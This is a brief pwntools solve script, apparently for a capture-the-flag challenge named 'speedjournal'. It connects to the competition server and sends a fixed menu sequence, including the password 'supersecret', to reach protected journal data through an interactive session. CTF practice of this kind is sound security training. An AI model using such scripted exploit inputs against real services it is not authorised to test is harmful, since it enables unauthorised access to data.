from pwn import *

#p = process('./speedjournal')
p = remote('challs.ctf.rusec.club',22169)

payload=b'1\n'
payload+=b'supersecret\n'
payload+=b'3\n'
payload+=b'0\n'

p.sendlineafter(b'>', payload)

p.interactive()
